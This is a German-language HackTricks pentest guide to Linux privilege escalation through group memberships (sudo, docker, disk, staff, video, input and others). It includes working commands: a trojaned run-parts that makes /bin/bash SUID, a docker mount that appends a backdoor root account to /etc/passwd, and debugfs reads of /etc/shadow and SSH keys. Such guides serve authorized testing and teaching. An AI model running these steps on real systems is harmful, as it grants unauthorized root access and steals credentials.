# Interessante Gruppen - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin-Gruppen

### **PE - Methode 1**

**Manchmal** enthält die **/etc/sudoers**-Richtlinie eines Systems (oder eine darin eingebundene Datei) Einträge wie diese:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Das bedeutet, dass jeder Benutzer, auf den einer der beiden Einträge zutrifft, über `sudo` jeden Befehl als beliebiger Zielbenutzer ausführen kann (vorbehaltlich der übrigen Richtlinie).<sup>[[3]](#references)</sup>

Ist dies der Fall, kannst du **einfach Folgendes ausführen, um root zu werden**:

```
sudo su
```

Wenn `sudo -l` einen eingeschränkten Aufruf von `adduser` nur mit einem Benutzernamen erlaubt, prüfe, ob dabei eine gleichnamige primäre Gruppe erstellt wird, die noch nicht existiert. Ein neues Konto in dieser Gruppe kann Privilegien erhalten, wenn die wirksame sudoers-Richtlinie bereits Privilegien für `%group` gewährt. Überprüfe sowohl das Verhalten beim Erstellen der Gruppe als auch die Gruppenregel, bevor du dies als Privilegieneskalationspfad einstufst. Das Erstellen eines Kontos verändert das System; prüfe daher zuerst die Richtlinie.

### PE - Method 2

Finde alle SUID-Binärdateien und prüfe, ob **Pkexec** darunter ist:

```bash
find / -perm -4000 2>/dev/null
```

Wenn **pkexec eine SUID-Binärdatei ist**, kann es ein Programm nur dann als ein anderer Benutzer ausführen, wenn polkit die angeforderte Aktion autorisiert; das SUID-Bit allein garantiert keinen Root-Zugriff. Prüfe die installierte Richtlinie und die Autorisierung der Zielsitzung, statt anzunehmen, dass die Mitgliedschaft in **sudo** oder **admin** ausreicht.<sup>[[4]](#references)[[5]](#references)</sup>

Prüfe für den separaten [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)-Angriffsweg zunächst, ob `pkexec` eine ausführbare, **root-eigene SUID**-Datei ist. Eine installierte Binärdatei ohne dieses Bit ist nicht die in der Sicherheitsmeldung beschriebene lokale SUID-Eskalation. Eine Upstream-Versionsnummer ist lediglich ein Hinweis: Distributionen können den [Fix in ältere Paketversionen zurückportieren](https://ubuntu.com/security/CVE-2021-4034). Prüfe daher das installierte Herstellerpaket und die Abhilfemaßnahmen, bevor du das System als verwundbar einstufst.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) ist ein anderer polkit-Angriffsweg: ein D-Bus-Autorisierungs-Race und kein `pkexec`-SUID-Fehler. Prüfe das installierte polkit-Herstellerpaket und ob eine erreichbare privilegierte D-Bus-Aktion eine nützliche Änderung bewirken kann. Ein Weg zur Kontoerstellung benötigt außerdem einen geeigneten Dienst wie AccountsService, und der sudo-Zugriff einer neu erstellten Gruppe hängt von der effektiven sudo-Richtlinie ab. Eine gemeldete polkit-Version oder ein installierter Dienst allein ist lediglich ein möglicher Ansatzpunkt, insbesondere wenn Hersteller [Fixes zurückportieren](https://access.redhat.com/security/cve/cve-2021-3560). Eine passive Enumeration sollte das Race nicht auslösen.

Auf Distributionen, die noch das ältere Local Authority-Backend verwenden, kannst du die Gruppenregeln mit folgendem Befehl prüfen:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Die relevanten Gruppennamen und Standardwerte variieren je nach Distribution; eine Gruppe ist hier nur dann nützlich, wenn sie in der lokalen Richtlinie aufgeführt ist.<sup>[[5]](#references)</sup>

Um **root zu werden, kannst du Folgendes ausführen**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Wenn du versuchst, **pkexec** auszuführen, und diesen **Fehler** erhältst:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

In einer SSH-Sitzung ohne registrierten Authentication Agent schlägt `pkexec` möglicherweise mit diesem Fehler fehl, selbst wenn die Richtlinie die Aktion ansonsten erlauben würde; polkit dokumentiert `pkttyagent` als textbasierten Authentication Agent für Sitzungen ohne Desktop. Das genaue Verhalten hängt von Version und Distribution ab. Überprüfen Sie daher die lokale Richtlinie und die Agent-Konfiguration. Eine für betroffene NixOS-Versionen gemeldete Umgehung erfordert **2 verschiedene SSH-Sitzungen**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Eine ACL, die einem Konto den Zugriff auf `su` verweigert, gilt für diese ausführbare Datei, nicht für jeden Weg zu einer Aktion, die von einem Administrator autorisiert werden kann. Wenn eine Administrator-Zugangsdaten unabhängig davon offengelegt wurden, prüfen Sie, ob eine separate Aktion wie das Starten eines temporären Systemdienstes über `systemd-run` gemäß der wirksamen polkit-Richtlinie zulässig ist, welche Identität der Authentication Agent akzeptiert und welche Identität der gestartete Dienst verwenden würde. [Polkit unterscheidet die Authentifizierung als Sitzungsinhaber von der als Administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), während [systemd-run beim System-Manager einen temporären Dienst anfordern kann](https://systemd.io/CONTROL_GROUP_INTERFACE/). Ein Eintrag im Verlauf, ein installiertes Kommando oder eine lesbare Richtliniendatei belegt für sich genommen weder eine Autorisierung noch die Gültigkeit von Zugangsdaten; bei einer passiven Prüfung sollten weder Zugangsdaten eingegeben noch eine Unit gestartet werden.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel-Gruppe

Manchmal kann eine sudoers-Richtlinie auch diesen Eintrag enthalten:

```
%wheel	ALL=(ALL:ALL) ALL
```

Das bedeutet, dass jeder Benutzer, auf den der Eintrag zutrifft, über `sudo` jeden Befehl als beliebiger Zielbenutzer ausführen kann (vorbehaltlich der übrigen Richtlinie).<sup>[[3]](#references)</sup>

Wenn dies der Fall ist, kannst du **einfach root werden, indem du Folgendes ausführst**:

```
sudo su
```

## Shadow Group

Auf Systemen, deren Berechtigungen dies erlauben, können Benutzer in der Gruppe **shadow** **/etc/shadow** **lesen**; überprüfe den tatsächlichen Modus und die ACLs auf dem Ziel:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Lies also die Datei und versuche, **einige Hashes zu cracken**.

Wichtiger Hinweis zum Sperrstatus beim Einordnen von Hashes:
- Einträge mit `!` oder `*` sind bei Passwortanmeldungen im Allgemeinen nicht interaktiv.
- `!hash` bedeutet, dass das Passwort gesperrt wurde; die verbleibenden Zeichen stellen den Passwortfeldwert vor der Sperrung dar.
- Ein Feld mit `*` ist kein gültiger `crypt(3)`-Hash und verhindert die Anmeldung mit einem UNIX-Passwort; leite daraus nicht ab, ob zuvor ein Passwort festgelegt war.
Dies ist für die Kontoeinordnung nützlich, auch wenn eine direkte Anmeldung blockiert ist.<sup>[[6]](#references)</sup>

## Mitarbeitergruppe

**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) vorzunehmen, ohne Root-Rechte zu benötigen (beachte, dass ausführbare Dateien in `/usr/local/bin` in der PATH-Variablen jedes Benutzers enthalten sind und ausführbare Dateien in `/bin` und `/usr/bin` mit demselben Namen „überschreiben“ können). Vergleiche dies mit der Gruppe „adm“, die eher mit Überwachung/Sicherheit zu tun hat.<sup>[[2]](#references)[[7]](#references)</sup>

Bei Debian-Konfigurationen, in denen `/usr/local/bin` in `PATH` vor `/usr/bin` steht (wie in den Beispielen unten), wird bei einem Befehl ohne Pfadangabe zuerst die Kopie unter `/usr/local/bin` ausgeführt; überprüfe den effektiven `PATH` auf dem Zielsystem.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Wenn ein privilegierter Prozess einen nicht qualifizierten Befehl über ein beschreibbares `/usr/local/bin` auflöst, kann das Ersetzen dieses Befehls mit den Privilegien des Prozesses ausgeführt werden; bestätige vor dem Testen den tatsächlichen Pfad und Auslöser.

Auf Ubuntu-Systemen führt `pam_motd` beim Login ausführbare Skripte über `run-parts --lsbsysinit` als root aus; Cron-Jobs können ebenfalls `run-parts` verwenden, dies hängt jedoch von der Distribution und Konfiguration ab.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Bei einer neuen SSH-Anmeldung kann `pspy` dabei helfen, zu bestätigen, ob dieser Pfad auf dem Zielsystem tatsächlich aufgerufen wird; es kann Prozess-Befehlszeilen ohne Root-Rechte beobachten.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

Die Mitgliedschaft in der Gruppe **disk** kann direkten Zugriff auf Blockgeräte gewähren und kommt oft **Root-Zugriff nahe**; Debian beschreibt sie als weitgehend gleichbedeutend mit Root-Zugriff. Überprüfe jedoch die tatsächlichen Geräteberechtigungen und das Speicherlayout auf dem Ziel.<sup>[[7]](#references)</sup>

Zu den üblichen Gerätepfaden gehört `/dev/sd*`, aber NVMe und andere Speicherlayouts verwenden andere Namen.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` arbeitet mit ext2/ext3/ext4-Dateisystemen; Pfade wie `/root` und `/etc/shadow` oben sind Dateien im geöffneten Dateisystem, während das zweite Argument von `dump` ein Ausgabepfad im nativen Dateisystem ist.<sup>[[8]](#references)</sup> Zum Beispiel extrahiert dies `/tmp/asd1.txt` aus dem geöffneten Dateisystem nach `/tmp/asd2.txt` im nativen Dateisystem:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Die Option `-w` öffnet das Dateisystem mit Lese- und Schreibzugriff, und der Befehl `write` kopiert eine native Datei in das geöffnete Dateisystem. Vermeide die Verwendung auf einem eingebundenen Live-Dateisystem, da direkte Änderungen das Dateisystem beschädigen können; arbeite nach Möglichkeit mit einem Offline-Image.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

Mit dem Befehl `w` kannst du herausfinden, **wer am System angemeldet ist**. Er zeigt eine Ausgabe wie die folgende.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Der Eintrag **tty1** bezeichnet die erste virtuelle Linux-Konsole; er beweist für sich allein nicht, dass sich ein Benutzer physisch am Rechner befindet, insbesondere in Containern oder anderen Umgebungen.<sup>[[21]](#references)</sup>

Auf Systemen mit einem lesbaren Framebuffer-Gerät kann die Mitgliedschaft in der Gruppe **video** Zugriff auf dieses Gerät gewähren. Die Linux-Framebuffer-Schnittstelle dokumentiert `/dev/fb0` als lesbares Speichergerät, das für eine Bildschirmaufnahme kopiert werden kann; der Pfad `/sys/class/graphics/fb0/virtual_size` ist nur verfügbar, wenn dieses fbdev-sysfs-Attribut vorhanden ist. Prüfe daher zunächst das Zielsystem.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Wenn die installierte Version von **GIMP** einen Importer für Rohdaten bereitstellt, öffne **`screen.raw`** damit; die unterstützten Formate und Steuerelemente unterscheiden sich je nach Version und Plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Um das Rohbild zu öffnen, kannst du GIMP verwenden, die Datei screen.raw auswählen und als Dateityp „Raw image data“ wählen](<../../../images/image (463).png>)

Stelle die Bildbreite und -höhe passend zur Geometrie des Framebuffers ein; probiere die verfügbaren Pixelformate/Bildtypen aus, bis die Ausgabe lesbar ist.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Ändere dann Breite und Höhe auf die Werte des Bildschirms, überprüfe verschiedene Bildtypen und wähle denjenigen aus, bei dem der Bildschirm am besten zu sehen ist](<../../../images/image (317).png>)

## Eingabegruppe

Auf Systemen, auf denen die Gruppe `input` Leseberechtigung für Tastatur-Event-Geräte hat, können Gruppenmitglieder rohe Tastatureingaben von diesem Gerät mitlesen. Prüfe zuerst die tatsächlichen Berechtigungen und ACLs: Eine aktive lokale Sitzung kann stattdessen über eine `uaccess`-ACL Zugriff erhalten, und der Gruppenname allein garantiert keinen Zugriff.<sup>[[23]](#references)[[24]](#references)</sup>

Finde den `eventX`-Handler der Tastatur und bestätige, dass das aktuelle Konto dessen Gerätedatei lesen kann. Überwache dann einen kurzen autorisierten Test mit `evtest`. Verwende **nicht** `--grab`: Damit wird exklusiver Zugriff angefordert, wodurch andere Anwendungen möglicherweise keine Eingaben mehr empfangen.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` meldet Tastencodes statt fertigen Text: Der Wert `1` steht für Drücken, `0` für Loslassen und `2` für Wiederholen. Dadurch können Tastenanschläge offengelegt werden, die in einer anderen Sitzung über dieselbe physische Tastatur eingegeben werden, einschließlich Zugangsdaten. Dies allein verschafft jedoch keinen Root-Zugriff. Ein Desktop-Compositor verhindert den Zugriff auf den rohen Geräteknoten nicht.<sup>[[25]](#references)</sup>

Weitere Prüfungen zu Identitäten und Sitzungen finden Sie unter [Benutzer und Sitzungen](../user-and-session-triage.md).

## Root-Gruppe

Die Mitgliedschaft in der Gruppe **root** verleiht nicht die UID von root. Dateien, die `root` gehören und für die Gruppe beschreibbar sind, können jedoch interessant sein, wenn privilegierte Dienste oder Bibliotheken sie verwenden. Prüfen Sie die tatsächlichen Dateiberechtigungen und die Verwendung, bevor Sie dies als Pfad zur Rechteausweitung einstufen.

**Prüfen, welche Dateien Mitglieder der Gruppe root ändern können**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Die Mitgliedschaft in der Gruppe `docker` gewährt bei standardmäßigen rootful-Installationen Zugriff auf den Docker-Daemon mit Root-Rechten. Da Bind-Mounts standardmäßig Lese- und Schreibzugriff erlauben, kann ein Benutzer, der diesen Daemon steuern kann, das `/` des Hosts in einen Container mounten und Host-Dateien ändern; dadurch erhält er effektiv Root-Rechte auf dem Host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Die Gruppenmitgliedschaft kann zwischen `/etc/group`, `/etc/gshadow` und dem Token des aktuellen Prozesses abweichen. Wenn ein Benutzer in `id -nG` nicht aufgeführt ist, `newgrp docker` aber erfolgreich ist, prüfe die von `id` in der neuen Shell angezeigte Gruppe und teste, ob der Docker-Socket tatsächlich beschreibbar ist und einen rootful Daemon bedient. Der Gruppenname allein belegt keine Kontrolle über den Host. Begrenze jede automatisierte `newgrp`-Probe, damit eine Passwortabfrage die Enumeration nicht blockiert.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Schließlich kannst du, wenn dir keine der vorherigen Vorschläge zusagt oder sie aus irgendeinem Grund nicht funktionieren (Docker-API-Firewall?), immer versuchen, **einen privilegierten Container zu starten und daraus auszubrechen**, wie hier erklärt:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Wenn du Schreibberechtigungen für den Docker-Socket hast, lies [**diesen Beitrag darüber, wie du durch Missbrauch des Docker-Sockets deine Privilegien erweitern kannst**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd-Gruppe

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Gruppe Adm

**Mitglieder** der Gruppe **`adm`** haben normalerweise die Berechtigung, **Logdateien** in _/var/log/_ zu lesen.\
Wenn du also einen Benutzer aus dieser Gruppe kompromittiert hast, solltest du dir unbedingt die **Logs ansehen**.<sup>[[7]](#references)</sup>

## Gruppen Backup / Operator / lp / Mail

Diese Gruppen haben dienst- und distributionsspezifische Bedeutungen. Debian dokumentiert `backup` für delegierte Sicherungs- und Wiederherstellungsaufgaben, `lp` für Drucker-Daemons und `mail` für `/var/mail`. Prüfe daher die lokalen Berechtigungen, bevor du die Mitgliedschaft als möglichen Weg zur Rechteausweitung betrachtest.<sup>[[7]](#references)</sup>

Sie sind oft eher **Vektoren zur Aufdeckung von Zugangsdaten** als direkte Wege zu Root:
- **backup**: Kann Archive mit Konfigurationen, Schlüsseln, Datenbank-Dumps oder Tokens zugänglich machen.
- **operator**: Distributionsspezifischer operativer Zugriff, durch den sensible Laufzeitdaten geleakt werden können.
- **lp**: Druckwarteschlangen und Spool-Dateien können Dokumentinhalte enthalten.
- **mail**: Mail-Spools können Links zum Zurücksetzen von Passwörtern, OTPs und interne Zugangsdaten offenlegen.

Betrachte eine Mitgliedschaft in diesen Gruppen als schwerwiegenden Fund zur Offenlegung von Daten und suche nach wiederverwendeten Passwörtern oder Tokens.

## Gruppe Auth

Unter OpenBSD gehört `/etc/skey` bei konfiguriertem S/Key `root:auth`; für den Zugriff auf die Datensätze ist die Gruppe `auth` erforderlich. YubiKey-Datensätze werden unter `/var/db/yubikey` gespeichert.<sup>[[16]](#references)[[17]](#references)</sup> Eine anfällige OpenBSD-6.6-Konfiguration mit aktiviertem S/Key oder YubiKey ermöglichte es lokalen Benutzern mit `auth`-Privilegien, Root-Rechte zu erlangen. Qualys dokumentiert die Voraussetzungen und die Exploit-Kette; der verlinkte PoC implementiert diese.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [pkexec/pkttyagent-Authentifizierung ohne GUI-Sitzung (NixOS Issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Systemgruppen – Debian-Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian-Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit-Referenzhandbuch](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit-Referenzhandbuch](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Handbuch zur Absicherung von Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux-Handbuchseite](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Das Framebuffer-Gerät — Linux-Kernel-Dokumentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu-Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian-Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — Prozessüberwachung unter Linux ohne Root-Rechte](https://github.com/DominicBreuker/pspy)
- [13] [Sicherheit der Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Docker als Nicht-Root-Benutzer verwalten](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Container ausführen — Docker-Dokumentation](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD-Handbuchseiten](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD-Handbuchseiten](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentifizierungs-Schwachstellen in OpenBSD — Qualys-Sicherheitswarnung](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — lokaler Exploit-PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Zugewiesene Linux-Geräte (Version 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Bildimport und -export — GIMP-Dokumentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Hinweise zu Berechtigungen für das beep-Gerät — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — systemd-Handbuch](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Eingabeereigniscodes — Linux-Kernel-Dokumentation](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Debian-Manpages](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
